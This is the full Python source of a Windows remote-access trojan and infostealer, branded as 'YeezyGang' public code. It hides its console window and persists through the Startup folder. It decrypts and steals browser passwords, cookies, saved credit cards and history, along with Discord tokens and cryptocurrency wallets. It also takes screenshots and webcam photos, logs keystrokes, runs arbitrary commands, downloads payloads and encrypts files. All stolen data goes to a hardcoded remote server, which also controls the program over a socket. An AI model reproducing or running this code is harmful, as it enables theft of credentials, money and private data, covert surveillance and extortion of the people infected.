import win32gui, win32console;win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
from cryptography.fernet import Fernet
import socketio, base64, os, socket, platform, requests, sqlite3, json, shutil, random, string, re, time, threading, cv2, zipfile, ctypes, sys, webbrowser, keyboard
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from PIL import ImageGrab

sio = socketio.Client()

wapned_path = os.getenv("temp") + "/"
random_name = lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv("appdata")
on = False

'''
PUBLIC CODE OF YEEZYGANG

DEV: DIPRE

YEEZYGANG MAKE MONEY

YEEZYGANG ON TOP
'''

class Startup:
    def __init__(self) -> None:
        self.filename = sys.argv[0]
        self.path = f"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bit64start.{self.filename.split('.')[-1]}"
        if not os.path.exists(self.path):
            shutil.copy(
                self.filename,
                self.path)

class Browser:
    def __init__(self, name, path) -> None:
        self.path = path
        self.name = name
        self.profiles = [
            '/Default',
            '/Profile 1',
            '/Profile 2',
            '/Profile 3',
            '/Profile 4',
            '/Profile 5',
            ]
        self.profiles = [profile for profile in self.profiles if os.path.exists(path + profile)]
        information['browsers'][self.name]={}
        self.master_key = self.get_master_key()
    
    def get_master_key(self) -> bytes:
        with open(os.path.join(self.path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt(self, buff: bytes) -> str:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass

    def create_temporal_db(self, db) -> str:
        if os.path.exists(db):
            copy_path = wapned_path + random_name(10)
            try:
                print(copy_path)
                shutil.copy(db, copy_path)
            except Exception as e:
                print(e)
                return False
            return copy_path
        else:
            return False

    def cards(self) -> None:
        for profile in self.profiles:
            original_db = self.path + profile + "/Web Data"
            temporal_db = self.create_temporal_db(original_db)
            
            if not temporal_db: return
            conn = sqlite3.connect(temporal_db)
            cursor = conn.cursor()
            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

            cards = [
                {
                "name":info[0],
                "month":info[1],
                "year":info[2],
                "number":self.decrypt(info[3]),
                "date_modified":info[4]
                }for info in cursor.fetchall()
                if info[0] or info[1] or info[2] or info[3]
            ]
            
            information['browsers'][self.name]['cards']=cards
            conn.close()
            os.remove(temporal_db)
            return cards
        
    def passwords(self) -> None:
        for profile in self.profiles:
            original_db = self.path + profile + "/Login Data"
            temporal_db = self.create_temporal_db(original_db)
            if not temporal_db: return
            
            conn = sqlite3.connect(temporal_db)
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')

            passwords = [
                {
                "url":info[0],
                "username":info[1],
                "password":self.decrypt(info[2])
                }for info in cursor.fetchall()
                if info[2]
            ]
            information['browsers'][self.name]['passwords'] = passwords
            information['passwords'] = information['passwords'] + passwords
            conn.close()
            os.remove(temporal_db)
            return passwords

    def history(self) -> None:
        for profile in self.profiles:
            original_db = self.path + profile + f"/History"
            
            temporal_db = self.create_temporal_db(original_db)
            if not temporal_db: return
            
            conn = sqlite3.connect(temporal_db)
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')

            history = [
                {
                "url":info[0],
                "title":info[1],
                "timestamp":info[2]
                }for info in cursor.fetchall()[0:1500]
                if info[0] and info[1] and info[2]
            ]
            information['browsers'][self.name]['web-history']=history
            conn.close()
            os.remove(temporal_db)
            return history

    def cookies(
        self
        ) -> None:
        for profile in self.profiles:
            original_db = self.path + profile + f"/Network/Cookies"
            temporal_db = self.create_temporal_db(
                original_db
                )
            if not temporal_db:
                return
            
            conn = sqlite3.connect(
                temporal_db
            )
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies'
            )
            
            cookies = [
                {
                "url":info[0],
                "expires":info[1],
                "path":info[2],
                "name":self.decrypt(info[3]),
                "value":info[4]
                }
                for info in cursor.fetchall()
                if info[0] and info[1] and info[2] and info[3] and info[4]
            ]
            information["browsers"][self.name]["cookies"] = cookies
            information['cookies'] = information['cookies'] + cookies
            conn.close()
            os.remove(
                temporal_db
            )
            return cookies

class GrabbBrowsers:
    def __init__(
        self
        ) -> None:
        self.browsers = {
            'epic-privacy-browser': f'{appdata}/Epic Privacy Browser/User Data',
            'google-chrome-sxs': f'{appdata}/Google/Chrome SxS/User Data',
            'brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data',
            'microsoft-edge': f'{appdata}/Microsoft/Edge/User Data',
            'google-chrome': f'{appdata}/Google/Chrome/User Data',
            'yandex': f'{appdata}/Yandex/YandexBrowser/User Data',
            'cent-browser': f'{appdata}/CentBrowser/User Data',
            'sputnik': f'{appdata}/Sputnik/Sputnik/User Data',
            'uran': f'{appdata}/uCozMedia/Uran/User Data',
            '7star': f'{appdata}/7Star/7Star/User Data',
            'orbitum': f'{appdata}/Orbitum/User Data',
            'vivaldi': f'{appdata}/Vivaldi/User Data',
            'iridium': f'{appdata}/Iridium/User Data',
            'kometa': f'{appdata}/Kometa/User Data',
            'amigo': f'{appdata}/Amigo/User Data',
            'torch': f'{appdata}/Torch/User Data',
        }
    
    def start(
        self,
        option: str,
        ) -> None:
        content = []
        for name, path in self.browsers.items():
            if os.path.exists(path):
                BrowserObject = Browser(
                    name,
                    path
                )
                if option == 'cookies':
                    try:
                        a = BrowserObject.cookies()
                    except: pass

                elif option == 'passwords':
                    try:
                        a = BrowserObject.passwords()
                    except: pass

                elif option == 'cards':
                    try:
                        a = BrowserObject.cards()
                    except: pass

                elif option == 'history':
                    try:
                        a = BrowserObject.history()
                    except: pass

                elif option == 'all':
                    for operation in [
                        BrowserObject.cookies,
                        BrowserObject.passwords,
                        BrowserObject.cards,
                        BrowserObject.history,]:
                        try:
                            operation()
                        except:
                            pass
                if isinstance(a, list):
                    content = content + a

        return content


class GetTokens:
    def __init__(self):
        self.paths = {
        'Discord': f'{roaming}/discord/Local Storage/leveldb/',
        'Discord Canary': f'{roaming}/discordcanary/Local Storage/leveldb/',
        'Lightcord': f'{roaming}/Lightcord/Local Storage/leveldb/',
        'Discord PTB': f'{roaming}/discordptb/Local Storage/leveldb/',
        'Opera': f'{roaming}/Opera Software/Opera Stable/Local Storage/leveldb/',
        'Opera GX': f'{roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb/',
        'Amigo': f'{appdata}/Amigo/User Data/Local Storage/leveldb/',
        'Torch': f'{appdata}/Torch/User Data/Local Storage/leveldb/',
        'Kometa': f'{appdata}/Kometa/User Data/Local Storage/leveldb/',
        'Orbitum': f'{appdata}/Orbitum/User Data/Local Storage/leveldb/',
        'CentBrowser': f'{appdata}/CentBrowser/User Data/Local Storage/leveldb/',
        '7Star': f'{appdata}/7Star/7Star/User Data/Local Storage/leveldb/',
        'Sputnik': f'{appdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb/',
        'Vivaldi': f'{appdata}/Vivaldi/User Data/Default/Local Storage/leveldb/',
        'Chrome SxS': f'{appdata}/Google/Chrome SxS/User Data/Local Storage/leveldb/',
        'Chrome': f'{appdata}/Google/Chrome/User Data/Default/Local Storage/leveldb/',
        'Chrome1': f'{appdata}/Google/Chrome/User Data/Profile 1/Local Storage/leveldb/',
        'Chrome2': f'{appdata}/Google/Chrome/User Data/Profile 2/Local Storage/leveldb/',
        'Chrome3': f'{appdata}/Google/Chrome/User Data/Profile 3/Local Storage/leveldb/',
        'Chrome4': f'{appdata}/Google/Chrome/User Data/Profile 4/Local Storage/leveldb/',
        'Chrome5': f'{appdata}/Google/Chrome/User Data/Profile 5/Local Storage/leveldb/',
        'Epic Privacy Browser': f'{appdata}/Epic Privacy Browser/User Data/Local Storage/leveldb/',
        'Microsoft Edge': f'{appdata}/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',
        'Uran': f'{appdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',
        'Yandex': f'{appdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',
        'Brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',
        'Iridium': f'{appdata}/Iridium/User Data/Default/Local Storage/leveldb/'
    }
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
    
    def start(self) -> None:
        for name, path in self.paths.items():
            if os.path.exists(path):
                if "cord" in name:
                    self.get_discord(name, path)
                else:
                    self.get_browser(name, path)
        self.get_firefox()
            
    def get_master_key(self, path: str) -> bytes:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_data(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_discord(self, name, path) -> None:
        localstate = roaming+f'/{name.replace(" ", "").lower()}/Local State'
        if os.path.exists(localstate):
            for filename in [filename for filename in os.listdir(path) if filename.split(".")[-1] in ["log", "ldb"]]:
                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(self.regexp_enc, line):
                        master_key = self.get_master_key(localstate)
                        encrypted = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                        token = self.decrypt_data(encrypted, master_key)
                        Token(token)
    
    def get_browser(self, name, path) -> None:
        for filename in [filename for filename in os.listdir(path) if filename.split(".")[-1] in ["log", "ldb"]]:
            for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:
                for token in re.findall(self.regexp, line):
                    Token(token)

    def get_firefox(self) -> None:
        if os.path.exists(roaming+"/Mozilla/Firefox/Profiles"):
            for path, _, files in os.walk(roaming+"/Mozilla/Firefox/Profiles"):
                for file in [file for file in files if file.endswith('.sqlite')]:
                    for line in [x.strip() for x in open(f'{path}/{file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            Token(token)

class Token:
    def __init__(self, token: str) -> None:
        self.token = token
        self.check()

    def check(self) -> None:
        if not self.token in information['tokens']:
            information['tokens'].append(self.token)

class Grabb:
    def __init__(self) -> None:
        pass
    
    def getInformation(self) -> dict:
        information = {}
        try:
            hwid = os.popen('wmic csproduct get uuid').read().split('\n')[1].strip()
        except:
            hwid = "None"
        ip_adress = requests.get('https://api.ipify.org').text
        username = os.getenv("UserName") 
        computername = os.getenv("COMPUTERNAME")
        information["hwid"]=hwid
        information['username']=username
        information['computername']=computername
        information["os"]=platform.system() + " " + platform.version()
        information["ipv4"]=socket.gethostbyname(
            socket.gethostname()
        )
        information["ip"]=ip_adress
        information["machine"]=platform.machine()
        return information

    def screenshot(self) -> str:
        path = os.getenv('temp') + "/" + "image.png"
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        print(path)
        return path
    
    def webcam(self) -> str:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
        ret, frame = cap.read()
        if not ret:
            return
        filename = os.getenv('temp') + "/" + "webcam-photo.png"
        cv2.imwrite(filename, frame)
        cap.release()
        return filename

class FileMagnament:
    def __init__(
        self
        ) -> None:
        self.globals = [
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "OneDrive"),
            os.path.join(os.path.expanduser("~"), "Videos"),
        ]
        self.files = {}
    
    @staticmethod
    def convertPathToZip(
        name: str,
        path: str
        ) -> None:
        if os.path.exists(path):
            zip_name = wapned_path + name.replace(" ", "") + ".zip"
            os.chdir(path)
            if len(os.listdir(path)) > 0:
                with zipfile.ZipFile(zip_name, "w") as f:
                    for file in os.listdir(path):
                        f.write(file)
            return zip_name

    def basicGrb(
        self,
        wallets=False,
        relevant=False,
        read=True,
        ) -> dict:
        if wallets==True:
            self.paths = {
                "Atomic LevelDB": f"{roaming}/atomic/Local Storage/leveldb",
                "Exodus Wallet": f"{roaming}/Exodus/exodus.wallet",
                "Exodus Wallet LevelDB": f"{roaming}/Exodus/Local Storage/leveldb",
                "Atomic Wallet": f"{roaming}/AtomicWallet/Local Storage/leveldb",
                "Electrum Wallet": f"{roaming}/Electrum/wallets/leveldb",
                "Bitcoin Core": f"{roaming}/Bitcoin/Core/leveldb",
                "Litecoin Core": f"{roaming}/Litecoin/Core/leveldb",
                "Ethereum (Geth)": f"{roaming}/Ethereum/geth/leveldb",
                "Ethereum (Parity)": f"{roaming}/Ethereum/paritydb/leveldb",
                "Monero": f"{roaming}/Monero/lmdb/leveldb",
                "Dash Core": f"{roaming}/DashCore/blocks/index/leveldb",
            }
        elif relevant==True:
            self.paths = {
                "Epic Games LevelDB": f"{roaming}/Epic Games/UnrealEngineLauncher/Launcher/storage/assets/DataStore/filecache/*",
                "Steam LevelDB": f"{roaming}/Steam/config/*/localconfig.vdf",
                "Rockstar Games LevelDB": f"{roaming}/Rockstar Games/Social Club/Databases/*",
                "Ubisoft LevelDB": f"{roaming}/Ubisoft/Ubisoft Game Launcher/cache/core/*",
                "Origin LevelDB": f"{roaming}/Origin/LocalContent/EAD4*/cache/*",
                "GOG.com LevelDB": f"{roaming}/GOG.com/Galaxy/storage/cache/*",
                "Rave LevelDB": f"{roaming}/Rave/Local Storage/leveldb/"
            }
        for name, path in self.paths.items():
            zipfile = self.convertPathToZip(
                name=name,
                path=path
            )
            if zipfile != None:
                if read:
                    with open(zipfile, "rb") as f:
                        file_data = f.read()
                    self.files[zipfile.replace(wapned_path, "")]=file_data
                else:
                    self.files[zipfile.replace(wapned_path, "")]=open(zipfile, "rb")
        return self.files

    def searchFile(
        self,
        filename=None,
        filenames=None,
        path='C:/',
        ) -> str | dict:
        for act, dirs, files in os.walk(path):
            for file in files:
                if filename != None:
                    if filename.lower() in file.lower():
                        self.filesfiles.append(os.path.join(act, file))
                else:
                    for file_ in filenames:
                        if file_.lower() in file.lower():
                            self.files[random_name(5) + "-" + file]=open(os.path.join(act, file), "rb").read()
                            break

    def getBackupCodes(
        self
        ) -> dict:
        for path in self.globals:
            self.searchFile(
                filenames=[
                    "backup_codes",
                    "discord_backup",
                    "discord_codes",
                ],
                path=path
            )
        return self.files

class Encrypter:
    def __init__(
        self,
        path: str,
        key: str
        ) -> None:
        self.key = bytes(key, 'utf-8')
        self.fernet = Fernet(self.key)
        if os.path.isfile(path):
            self.paths = [path]
        if os.path.isdir(path):
            self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]
    
    def encryptFiles(
        self
        ) -> None:
        for file in self.paths:
            if os.path.exists(file):
                self.encrypt_file(file)
        return True

    def decryptFiles(
        self
        ) -> None:
        for file in self.paths:
            if os.path.exists(file):
                self.decrypt_file(file)
        return True

    def encrypt_name(
        self,
        file: str
        ) -> None:
        os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + ".exe")

    def encrypt_file(
        self, 
        file: str
        ) -> None:
        with open(file, 'rb') as f:
            e = self.fernet.encrypt(f.read())
        with open(file, 'wb') as f:
            f.write(e)

    def decrypt_file(
        self, 
        file: str
        ) -> None:
        with open(file, 'rb') as f:
            e = self.fernet.decrypt(f.read())
        with open(file, 'wb') as f:
            f.write(e)

Obj = Grabb()


on = False
class KeyLogger:
    def __init__(
        self
        ):
        self.data = []

    def keylog_event(
        self,
        key
        ) -> None:
        if key.event_type == keyboard.KEY_DOWN:
            self.data.append(key.name)
            self.ultimatum = time.time()
            print(f"Tecla presionada: {key.name}")

    def start(
        self
        ) -> None:
        global on
        on = True
        self.ultimatum = time.time()
        keyboard.hook(self.keylog_event)
        while on:
            if self.ultimatum != None:
                if (time.time() - self.ultimatum) > 5:
                    self.ultimatum = None
                    if len(self.data) > 100:
                        self.send()
        if not on:
            keyboard.unhook_all()

    def send(
        self
        ) -> None:
        sio.emit('keylog-response', self.data)
        self.data = []

@sio.event
def connect():
    sio.emit('join', user_id)
    print('Conectado al servidor')

@sio.on('command')
def command(cmd):
    sio.emit('command-response', os.popen(cmd['cmd']).read())

@sio.on('history')
def history():
    sio.emit('history-response', GrabbBrowsers().start('history'))

@sio.on('discord-tokens')
def tokens():
    information['tokens']=[]
    GetTokens().start()
    time.sleep(5)
    sio.emit('discord-tokens-response', information['tokens'])

@sio.on('cards')
def cards():
    sio.emit('cards-response', GrabbBrowsers().start('cards'))

@sio.on('passwords')
def passwords():
    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))

@sio.on('download')
def download(filename: str):
    if os.path.exists(filename):
        with open(filename, "rb") as f:
            data = f.read()
        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})
    else:
        sio.emit('download-response', False)

@sio.on('backup-codes')
def getBackupCodes():
    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())

@sio.on('cookies')
def cookies():
    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))

@sio.on('browsers')
def browsers():
    GrabbBrowsers().start('all',)
    sio.emit('browsers-response', information['browsers'])

@sio.on('website')
def website(url: str):
    try:
        webbrowser.open(url)
        sio.emit('website-response', True)
    except:
        sio.emit('website-response', False)

@sio.on('upload')
def upload(args: dict):
    try:
        response = requests.get(args['url'])
        if response.status_code == 200:
            with open(args['path'], "wb") as f:
                f.write(response.content)
            sio.emit('upload-response', True)
        else:
            sio.emit('upload-response', False)
    except Exception as e:
        sio.emit('upload-response', False)

@sio.on('alert')
def upload(alert: str):
    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()
    sio.emit('alert-response', True)

@sio.on('wallets')
def wallets():
    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))

@sio.on('gamestores')
def wallets():
    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))

@sio.on('screenshot')
def screenshot():
    with open(Obj.screenshot(), 'rb') as image_file:
        image_data = image_file.read()
        sio.emit('screenshot-response', image_data)

@sio.on('webcam')
def screenshot():
    file = Obj.webcam()
    with open(file, 'rb') as image_file:
        image_data = image_file.read()
        sio.emit('webcam-response', image_data)

@sio.on('ip')
def screenshot():
    sio.emit('ip-response', requests.get('https://api.ipify.org').text)

@sio.on('website')
def screenshot(url: str):
    sio.emit('website-response', webbrowser.open(url=url))

@sio.on('encrypt')
def encrypt(data):
    file = data['path']
    key = data['key']
    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())

@sio.on('decrypt')
def decrypt(data):
    file = data['path']
    key = data['key']
    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())

@sio.on('information')
def info():
    sio.emit('information-response', Obj.getInformation())

@sio.on('initkeylog')
def info(data: bool):
    global on
    global keylogthread
    if data:
        if not on:
            keylogthread = threading.Thread(target=KeyLogger().start).start()
            sio.emit('initkeylog-response', True)
        else:
            sio.emit('initkeylog-response', 101)
    else:
        on = False
        try:
            keylogthread.join()
        except:
            pass
        sio.emit('initkeylog-response', False)

@sio.on('listdir')
def listdir(path: str):
    if os.path.exists(path):
        sio.emit('listdir-response', {"path": path, "files":os.listdir(path)})
    else:
        sio.emit('listdir-response', False)

@sio.event
def disconnect():
    pass

def define_(
    id_: str,
    api_: str,
    init=True,
    ) -> None:
    global user_id
    user_id = id_
    global api_url
    api_url = api_
    global information
    if init:
        try:
            Startup()
            wallets_ = FileMagnament().basicGrb(wallets=True, read=False)
            information = {
                "passwords":[],
                "cookies":[],
                "browsers":{},
                "tokens":[],
                "information":Obj.getInformation(),
                "wallets":[name for name, x in wallets_.items()],
            }
            GrabbBrowsers().start('all')
            GetTokens().start()
            r = requests.post(
                url=f'{api_url}/api/{user_id}/',
                json=information,
            )
            
            r = requests.post(
                url=f'{api_url}/api/{user_id}/wallets/',
                files=wallets_,
            )
        except:
            pass

    information = {}

    sio.connect(api_url)
    try:
        sio.wait()
    except Exception as e:
        print(e)
    sio.disconnect()

api = "https://yeezy-api.onrender.com/"
user_id = "1166039508446351390"

define_(
    user_id,
    api,
    True,
)
